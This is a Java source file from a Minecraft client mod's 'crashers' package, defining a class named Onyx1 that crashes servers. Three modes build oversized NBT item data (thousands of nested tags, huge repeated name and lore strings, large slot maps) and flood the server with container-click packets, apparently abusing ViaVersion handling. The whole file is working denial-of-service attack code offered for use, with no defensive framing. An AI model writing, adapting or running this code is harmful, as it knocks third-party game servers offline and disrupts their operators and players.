package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.List;
import java.util.Locale;
import java.util.Optional;

public class Onyx1 implements Crasher {
    private static final String METHOD_NAME = "Onyx1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        String mode = args[3].toLowerCase(Locale.ROOT);
        int size = Integer.parseInt(args[4]);

        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        CompoundTag comp = new CompoundTag();
        Int2ObjectMap<ItemStack> int2objectmap = new Int2ObjectOpenHashMap<>();

        switch (mode){
            case "comp" -> {
                CompoundTag finalComp = new CompoundTag();
                
                for (int j = 0; j < size; j++) comp.put("xynis-viaver-exploit" + j, finalComp);
                ItemStack is = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(comp));

                for (int i = 0; i < packets; i++)
                    PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, is, int2objectmap));
            }
            case "display" -> {
                ListTag lore = new ListTag();
                String longSpam = "X\nY\nN\nI\nS\n\n".repeat(size) + "X\nY\nN\nI\nS\n\n".repeat(size);
                StringTag loreLine = new StringTag(longSpam);

                for (int i = 0; i < 4; ++i) lore.add(loreLine);

                CompoundTag display = new CompoundTag();
                display.put("Name", new StringTag(longSpam));
                display.put("Lore", lore);
                comp.put("display", display);

                ItemStack is = new ItemStack(Items.CHERRY_CHEST_BOAT, 1, Optional.of(comp));

                for (int i = 0; i < 10; ++i)
                    int2objectmap.put(i, is);

                for (int i = 0; i < packets; i++)
                    PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, is, int2objectmap, true, false));
            }
            case "map" -> {
                ItemStack stack = new ItemStack(Items.BEDROCK, 1, Optional.empty());
                for (int i = 0; i < size; i++)
                    int2objectmap.put(i, stack);

                for (int i = 0; i < packets; i++)
                    PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 1, 1, ClickType.PICKUP_ALL, stack, int2objectmap, false, true));
            }
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }


    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Power", OptionType.INTEGER),
                new OptionUtil("Mode", OptionType.LIST, new String[]{"Comp", "Display", "Map"}),
                new OptionUtil("Size", OptionType.INTEGER)
        );
    }

    @Override
    public String getArgsUsage() {
        return "Packets[1], Mode[Map], NBTPower[16000]";
    }

    @Override
    public String getDescription() {
        return "Overflow Warning Spammer [PE/ViaVer Abuser]";
    }
}